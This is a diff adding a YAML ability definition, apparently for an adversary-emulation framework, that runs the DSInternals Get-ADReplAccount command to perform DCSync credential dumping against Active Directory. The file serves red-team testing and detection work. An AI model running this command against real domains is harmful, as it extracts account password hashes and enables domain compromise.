@@ -1,0 +1,19 @@
+---
+- id: 1ee50167ef513edd176ff22f076f8790
+  name: Run DSInternals Get-ADReplAccount
+  description: "The following Atomic will run Get-ADReplAccount from DSInternals.\n\
+    Upon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/)\
+    \ CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1003.006
+    name: 'OS Credential Dumping: DCSync'
+  platforms:
+    windows:
+      psh:
+        command: Get-ADReplAccount -All -Server
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
